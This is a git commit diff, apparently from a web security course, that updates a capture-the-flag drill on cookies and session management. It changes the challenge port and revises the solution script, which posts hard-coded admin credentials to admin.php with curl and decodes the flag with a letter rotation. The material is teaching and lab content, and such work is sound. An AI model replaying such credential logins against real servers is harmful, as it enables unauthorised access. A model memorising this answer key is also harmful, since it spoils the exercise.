d2e5642e192e553be6188e109c907c0670de1cec
Gabriel Mocanu <gabi.mocanu98@gmail.com>
2026-01-02 13:53:51 +0200

    chore(cookies): update do-you-need-glasses challenge
    Signed-off-by: Gabriel Mocanu <gabi.mocanu98@gmail.com>

--- chapters/web-application-security/cookies-and-session-management/drills/do-you-need-glasses/README.md
+++ chapters/web-application-security/cookies-and-session-management/drills/do-you-need-glasses/README.md
@@ -2,7 +2,7 @@
 
 ## Description
 
-Get the flag from http://141.85.224.115:8086.
+Get the flag from http://141.85.224.115:8089.
 
 Score: 75
 
--- chapters/web-application-security/cookies-and-session-management/drills/do-you-need-glasses/sol/solution.sh
+++ chapters/web-application-security/cookies-and-session-management/drills/do-you-need-glasses/sol/solution.sh
@@ -1,19 +1,17 @@
 #!/bin/bash
-PORT=8086
+PORT=8089
 
-if [[ $1 == "local" ]]
-then
-    url='http://127.0.0.1:'$PORT
-elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
-then
-    url='http://141.85.224.157:'$PORT
+if [[ $1 == "local" ]]; then
+  url='http://127.0.0.1:'$PORT
+elif [[ $1 == "remote" ]] && [[ -z $2 ]]; then
+  url='http://141.85.224.157:'$PORT
 else
-    url=$1':'$2
+  url=$1':'$2
 fi
 
 # Do you need glasses
 echo "Start exploit for Do you need glasses"
 url=$url'/admin.php'
-flag=$(curl -s -X POST -F 'username=admin' -F 'password=jukxoqnnca' -F 'secret=42'  $url | grep -o "MMM{.*}" | tr 'A-Za-z' 'G-ZA-Fg-za-f')
+flag=$(curl -s -X POST -F 'username=admin' -F 'password=jukxoqnnca' -F 'secret=42' $url | grep -o "FFF{.*}" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
 echo "Flag is $flag"
 echo "----------------------------"
